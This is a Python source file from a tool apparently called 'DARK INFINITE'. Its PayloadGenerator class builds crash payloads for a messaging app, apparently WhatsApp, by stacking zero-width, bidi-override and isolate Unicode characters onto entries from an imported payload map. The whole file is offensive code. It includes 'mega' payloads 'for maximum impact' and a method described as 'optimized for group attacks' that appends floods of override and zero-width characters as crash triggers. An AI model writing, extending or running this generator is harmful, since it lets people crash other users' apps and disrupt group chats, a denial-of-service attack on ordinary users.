"""
DARK INFINITE - Payload Generator
Generates crash payloads using invisible Unicode characters
"""

import random
import string
from config import PAYLOAD_MAP, MAX_PAYLOAD_MULTIPLIER

class PayloadGenerator:
    """Generates WA crash payloads from Unicode combos"""
    
    @staticmethod
    def generate(bug_type, multiplier=5):
        """Generate payload for a specific bug type"""
        if bug_type not in PAYLOAD_MAP:
            return None
        
        chars = PAYLOAD_MAP[bug_type]
        payload = ""
        
        for _ in range(multiplier):
            # Join all chars for this bug type
            payload += "".join(chars)
            # Add random zero-width chars for extra chaos
            payload += random.choice(["\u200B", "\u200C", "\u200D", "\u200E", "\u200F"])
        
        return payload
    
    @staticmethod
    def generate_custom(symbol_string, multiplier=5):
        """Generate payload from custom symbol"""
        payload = ""
        for _ in range(multiplier):
            payload += symbol_string
            payload += random.choice(["\u200B", "\u200C", "\u200D"])
        return payload
    
    @staticmethod
    def generate_mega_payload(bug_type, multiplier=10):
        """Generate a massive payload for maximum impact"""
        if bug_type not in PAYLOAD_MAP:
            return None
        
        chars = PAYLOAD_MAP[bug_type]
        payload = ""
        
        for _ in range(multiplier * 3):
            # Shuffle chars for unpredictable rendering
            shuffled = chars.copy()
            random.shuffle(shuffled)
            payload += "".join(shuffled)
            # Inject random invisible chars
            payload += random.choice([
                "\u200B", "\u200C", "\u200D", "\u200E", "\u200F",
                "\u202A", "\u202B", "\u202C", "\u202D", "\u202E",
                "\u2066", "\u2067", "\u2068", "\u2069"
            ])
        
        return payload
    
    @staticmethod
    def generate_random_mutation(multiplier=5):
        """Generate a random mutation payload"""
        all_chars = [
            "\u200B", "\u200C", "\u200D", "\u200E", "\u200F",
            "\u202A", "\u202B", "\u202C", "\u202D", "\u202E",
            "\u2066", "\u2067", "\u2068", "\u2069",
            "\uA9C4", "\uA9BE", "\uA9C0", "\uA9C1"
        ]
        
        payload = ""
        for _ in range(multiplier * 10):
            payload += random.choice(all_chars)
        
        return payload
    
    @staticmethod
    def get_available_bugs():
        """Return list of available bug types"""
        return list(PAYLOAD_MAP.keys())
    
    @staticmethod
    def generate_group_payload(bug_type, multiplier=5):
        """Generate payload optimized for group attacks"""
        base_payload = PayloadGenerator.generate(bug_type, multiplier)
        if not base_payload:
            return None
        
        # Add group-specific crash triggers
        group_triggers = [
            "\u202E" * 5,  # RTL Override stack
            "\u2066" * 3 + "\u2069" * 3,  # Isolate stack
            "\u200B" * 20,  # Zero-width space flood
        ]
        
        return base_payload + random.choice(group_triggers)